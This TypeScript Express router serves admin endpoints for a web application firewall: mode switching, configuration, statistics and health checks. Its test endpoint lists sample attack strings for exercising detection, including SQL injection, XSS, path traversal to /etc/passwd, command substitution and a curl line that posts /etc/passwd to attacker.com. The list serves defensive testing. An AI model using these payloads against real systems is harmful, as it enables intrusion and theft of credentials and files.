import { Request, Response, Router } from 'express';
import { safeLogger } from '../lib/logger';
import { AdvancedWAF } from '../middlewares/simple-waf';

const securityRouter = Router();

/**
 * API Routes for WAF and Security Configuration
 * Protected admin routes for managing security settings
 */

// GET /api/admin/security/config - Get current WAF configuration
securityRouter.get('/config', (req: Request, res: Response) => {
  try {
    const config = AdvancedWAF.getConfig();
    const stats = AdvancedWAF.getStats();
    
    res.json({
      success: true,
      config,
      stats,
      features: {
        monitoring: {
          basic_sql_injection: true,
          basic_xss: true,
          path_traversal: true,
          basic_command_injection: true,
          rate_limiting: config.rateLimit.enabled,
          threat_detection: 'monitoring_only'
        },
        blocking: {
          basic_sql_injection: true,
          basic_xss: true,
          path_traversal: true,
          basic_command_injection: true,
          rate_limiting: config.rateLimit.enabled,
          threat_blocking: true,
          threat_detection: 'active_blocking'
        }
      }
    });
  } catch (error: any) {
    safeLogger.error({ error: error.message }, 'Security API: Error getting config');
    res.status(500).json({ 
      success: false, 
      error: 'Failed to get configuration' 
    });
  }
});

// POST /api/admin/security/mode - Switch between disabled, monitoring, and blocking modes
securityRouter.post('/mode', (req: Request, res: Response) => {
  try {
    const { mode } = req.body;
    
    if (!mode || !['disabled', 'monitoring', 'blocking'].includes(mode)) {
      return res.status(400).json({
        success: false,
        error: 'Invalid mode. Must be "disabled", "monitoring", or "blocking"'
      });
    }

    // Update WAF configuration
    AdvancedWAF.updateConfig({ mode });
    
    // Log the mode change
    safeLogger.info({ 
      mode, 
      adminUser: req.user?.id || 'unknown',
      timestamp: new Date().toISOString() 
    }, 'Security: WAF mode changed');

    // Get updated configuration
    const config = AdvancedWAF.getConfig();
    
    res.json({
      success: true,
      message: `WAF mode switched to ${mode}`,
      config,
      featuresEnabled: mode === 'blocking' ? {
        request_blocking: true,
        threat_scoring: true,
        pattern_matching: true,
        rate_limiting: config.rateLimit.enabled
      } : mode === 'monitoring' ? {
        threat_detection: true,
        request_logging: true,
        pattern_matching: true,
        rate_limiting: config.rateLimit.enabled
      } : {
        protection_disabled: true
      }
    });
  } catch (error: any) {
    safeLogger.error({ error: error.message }, 'Security API: Error switching mode');
    res.status(500).json({ 
      success: false, 
      error: 'Failed to switch mode' 
    });
  }
});

// PUT /api/admin/security/config - Update WAF configuration
securityRouter.put('/config', (req: Request, res: Response) => {
  try {
    const updates = req.body;
    
    // Validate configuration updates
    const validKeys = [
      'mode', 'rulesets', 'customPatterns', 'rateLimit'
    ];
    
    const validUpdate: any = {};
    
    for (const key of validKeys) {
      if (updates[key] !== undefined) {
        validUpdate[key] = updates[key];
      }
    }

    // Update WAF configuration
    AdvancedWAF.updateConfig(validUpdate);
    
    safeLogger.info({ 
      updates: validUpdate,
      adminUser: req.user?.id || 'unknown',
      timestamp: new Date().toISOString()
    }, 'Security: WAF configuration updated');
    
    // Return updated configuration
    const config = AdvancedWAF.getConfig();
    
    res.json({
      success: true,
      message: 'WAF configuration updated successfully',
      config
    });
  } catch (error: any) {
    safeLogger.error({ error: error.message }, 'Security API: Error updating config');
    res.status(500).json({ 
      success: false, 
      error: 'Failed to update configuration' 
    });
  }
});

// GET /api/admin/security/stats - Get detailed WAF statistics
securityRouter.get('/stats', (req: Request, res: Response) => {
  try {
    const stats = AdvancedWAF.getStats();
    const config = AdvancedWAF.getConfig();
    
    // Calculate additional metrics
    const blockRate = stats.totalRequests > 0 
      ? (stats.blockedRequests / stats.totalRequests * 100).toFixed(2)
      : '0.00';
    
    const threatDetectionRate = stats.totalRequests > 0
      ? (stats.detectedThreats / stats.totalRequests * 100).toFixed(2)
      : '0.00';
    
    res.json({
      success: true,
      stats: {
        ...stats,
        metrics: {
          block_rate_percent: parseFloat(blockRate),
          threat_detection_rate_percent: parseFloat(threatDetectionRate),
          uptime: process.uptime(),
          memory_usage: process.memoryUsage(),
          mode_features: config.mode === 'blocking' 
            ? 'Active blocking mode enabled'
            : config.mode === 'monitoring'
            ? 'Monitoring mode - logging only'
            : 'WAF disabled'
        }
      }
    });
  } catch (error: any) {
    safeLogger.error({ error: error.message }, 'Security API: Error getting stats');
    res.status(500).json({ 
      success: false, 
      error: 'Failed to get statistics' 
    });
  }
});

// POST /api/admin/security/clear-cache - Clear WAF cache (for testing)
securityRouter.post('/clear-cache', (req: Request, res: Response) => {
  try {
    AdvancedWAF.clearCache();
    
    safeLogger.info({ 
      adminUser: req.user?.id || 'unknown',
      timestamp: new Date().toISOString()
    }, 'Security: WAF cache cleared');
    
    res.json({
      success: true,
      message: 'WAF cache cleared successfully'
    });
  } catch (error: any) {
    safeLogger.error({ error: error.message }, 'Security API: Error clearing cache');
    res.status(500).json({ 
      success: false, 
      error: 'Failed to clear cache' 
    });
  }
});

// GET /api/admin/security/test - Test WAF with sample threats
securityRouter.get('/test', (req: Request, res: Response) => {
  try {
    const config = AdvancedWAF.getConfig();
    
    // Sample threat patterns for testing
    const testPatterns = {
      basic: [
        "' OR 1=1 --",
        "<script>alert('xss')</script>",
        "../../../etc/passwd",
        "$(cat /etc/passwd)"
      ],
      advanced: [
        "UNION SELECT password FROM users WHERE '1'='1",
        "BENCHMARK(5000000,MD5(1))",
        "<iframe src=\"javascript:alert('xss')\"></iframe>",
        "curl -d @/etc/passwd attacker.com"
      ]
    };
    
    const availablePatterns = config.mode === 'blocking' || config.mode === 'monitoring'
      ? [...testPatterns.basic, ...testPatterns.advanced]
      : testPatterns.basic;
    
    res.json({
      success: true,
      waf_mode: config.mode,
      test_patterns: availablePatterns,
      message: 'Use these patterns to test WAF detection',
      note: 'Send these in request parameters, body, or headers to trigger WAF'
    });
  } catch (error: any) {
    safeLogger.error({ error: error.message }, 'Security API: Error getting test patterns');
    res.status(500).json({ 
      success: false, 
      error: 'Failed to get test patterns' 
    });
  }
});

// GET /api/admin/security/health - Security health check
securityRouter.get('/health', (req: Request, res: Response) => {
  try {
    const config = AdvancedWAF.getConfig();
    const stats = AdvancedWAF.getStats();
    
    // Assess security health
    const healthChecks = {
      waf_enabled: config.mode !== 'disabled',
      rate_limiting_enabled: config.rateLimit.enabled,
      rulesets_configured: config.rulesets.length > 0,
      monitoring_active: config.mode === 'monitoring' || config.mode === 'blocking',
      blocking_active: config.mode === 'blocking',
      recent_activity: stats.totalRequests > 0,
      threat_detection: stats.detectedThreats > 0
    };
    
    const healthyChecks = Object.values(healthChecks).filter(Boolean).length;
    const totalChecks = Object.keys(healthChecks).length;
    const healthScore = Math.round((healthyChecks / totalChecks) * 100);
    
    let status = 'healthy';
    if (healthScore < 50) status = 'critical';
    else if (healthScore < 80) status = 'warning';
    
    res.json({
      success: true,
      security_health: {
        status,
        score: healthScore,
        mode: config.mode,
        checks: healthChecks,
        recommendations: healthScore < 100 ? [
          config.mode === 'disabled' && 'Enable WAF protection (set mode to monitoring or blocking)',
          !config.rateLimit.enabled && 'Enable rate limiting',
          config.rulesets.length === 0 && 'Configure WAF rulesets',
          config.mode === 'monitoring' && 'Consider enabling blocking mode for active protection'
        ].filter(Boolean) : []
      }
    });
  } catch (error: any) {
    safeLogger.error({ error: error.message }, 'Security API: Error checking health');
    res.status(500).json({ 
      success: false, 
      error: 'Failed to check security health' 
    });
  }
});

export default securityRouter;
